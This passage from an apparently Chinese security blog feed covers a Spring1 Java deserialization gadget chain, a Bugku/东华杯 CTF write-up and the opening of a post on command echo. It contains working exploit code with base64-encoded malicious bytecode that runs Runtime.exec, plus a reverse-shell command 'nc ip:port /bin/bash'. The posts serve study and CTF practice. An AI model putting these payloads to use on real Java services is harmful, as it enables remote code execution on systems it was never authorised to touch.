class="hljs java">HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>     map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br>     <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>     Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br></code></pre></td></tr></table></figure><p>接着只需要实例化<code>SerializableTypeWrapper#MethodInvokeTypeProvider</code>，就可以触发。</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>修改值，避免序列化时候就触发。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br>        <br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br><br>        <span class="hljs-type">Field</span>  <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br><br>       serialize(objects);<br>       unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Spring1中运用了很多的动态代理**(类似一种强转使得整个链子从this.objectFactory.getObject()以及 TypeProvider provider链接起来**)，主要</p><ul><li>利用动态代理将org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</li></ul><p>中的method.invoke(返回值,args)的返回值设置成TemplatesImpl。</p><ul><li>代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法。使得在org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider中，能够在this.provider.getType().getClass(), this.methodName找到属于this.provider.getType().getClass()的this.methodName</li></ul><p><strong>就是动态代理设置使得rg.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider中，能够在this.provider.getType().getClass(), this.methodName找到属于this.provider.getType().getClass()的this.methodName</strong></p><h2 id="一些小细节？"><a href="#一些小细节？" class="headerlink" title="一些小细节？"></a>一些小细节？</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204082359478.png" alt="QQ截图20220408235936"></p><p>这里如果不是getObject，就会引发报错。下面的getType也是如此。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204090000487.png" alt="QQ截图20220409000046"></p><p>这里也不再像cc那样有限制。（其实就是自己回想起来，这里跟cc关系没有多大关系，都灭有进入readObject中）但是必须是注释类型。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku</title>
    <link href="/2022/04/06/Bugku/"/>
    <url>/2022/04/06/Bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h1><h2 id="ez-java-serialize"><a href="#ez-java-serialize" class="headerlink" title="ez_java_serialize"></a>ez_java_serialize</h2><p>下载源码，清晰可见cc</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143676.png" alt="QQ截图20220406113052"></p><p>在用自己的代码，想进行恶意类加载<code>反弹shell</code>或者<code>创造回显</code>（本地是可以打通发的），均已失败告终。最后用yso，一键生成代码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143180.png" alt="QQ截图20220406113301"></p><p>这里经过测试<code>cc5.6.7</code>的链均可以打。但是实际上这里满足条件的还有1，3链</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143886.png" alt="QQ截图20220406113531"></p><p>1也没有通（lazymap的版本限制应该是），3因为之前进行类加载的时候就打不通，yso的cc3明显利用了，所以也打不通。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143916.png" alt="QQ截图20220406113933"></p><p>值得注意的一点这里，反弹shell用的  <code>nc ip:port /bin/bash</code><br>最后也成功的打了出来。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143078.png" alt="QQ截图20220406114105"></p><h2 id="东华杯"><a href="#东华杯" class="headerlink" title="东华杯"></a>东华杯</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204090011751.png" alt="QQ截图20220409001048"></p><p>绕过限制。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204090011992.png" alt="QQ截图20220409001118"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAKwoACQAcCgAdAB4IAB8KAB0AIAcAIQoABQAiBwAjCgAHABwHACQBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEA&quot;</span> +<br>                <span class="hljs-string">&quot;FUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHRoaXMBAAlMRXhwbG9pdDsBAA1TdGFja01hcFRhYmxl&quot;</span> +<br>                <span class="hljs-string">&quot;BwAjBwAhAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xh&quot;</span> +<br>                <span class="hljs-string">&quot;bmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAxFeHBsb2l0LmphdmEMAAoACwcAJQwAJgAnAQAIY2Fs&quot;</span> +<br>                <span class="hljs-string">&quot;Yy5leGUMACgAKQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACoACwEAB0V4cGxvaXQBABBqYXZhL2xh&quot;</span> +<br>                <span class="hljs-string">&quot;bmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5n&quot;</span> +<br>                <span class="hljs-string">&quot;L1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNz&quot;</span> +<br>                <span class="hljs-string">&quot;OwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACQAAAAAAAgABAAoACwABAAwAAAB8AAIAAgAAABYqtwAB&quot;</span> +<br>                <span class="hljs-string">&quot;uAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAA0AAAAaAAYAAAACAAQABQANAAgAEAAGABEA&quot;</span> +<br>                <span class="hljs-string">&quot;BwAVAAkADgAAABYAAgARAAQADwAQAAEAAAAWABEAEgAAABMAAAAQAAL/ABAAAQcAFAABBwAVBAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;ABYAFwABAAwAAABBAAIAAgAAAAm7AAdZtwAITLEAAAACAA0AAAAKAAIAAAAMAAgADQAOAAAAFgAC&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQAYABkAAAAIAAEADwASAAEAAQAaAAAAAgAb&quot;</span> );<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.ezgame.ctf.tools.ToStringBean&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classByte</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        classByte.setAccessible(<span class="hljs-literal">true</span>);<br>        classByte.set(toStringBean,code);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,toStringBean);<br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        objectOutputStream.writeObject(aClass);</span><br><span class="hljs-comment">//        objectOutputStream.writeUTF(&quot;Songshan&quot;);</span><br><span class="hljs-comment">//        objectOutputStream.writeInt(2022);</span><br><span class="hljs-comment">//        objectOutputStream.flush();</span><br><span class="hljs-comment">//        objectOutputStream.close();</span><br><span class="hljs-comment">//        String s = new String(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="hljs-comment">//        System.out.printf(s);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>javaCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化回显学习</title>
    <link href="/2022/04/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/04/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA反序列化回显学习"><a href="#JAVA反序列化回显学习" class="headerlink" title="JAVA反序列化回显学习"></a>JAVA反序列化回显学习</h1><p>刚刚问涛涛师傅要了一下他出的题，突然想起来很多题都是不出网没有回显的。来学习一下吧。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceEcho</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span 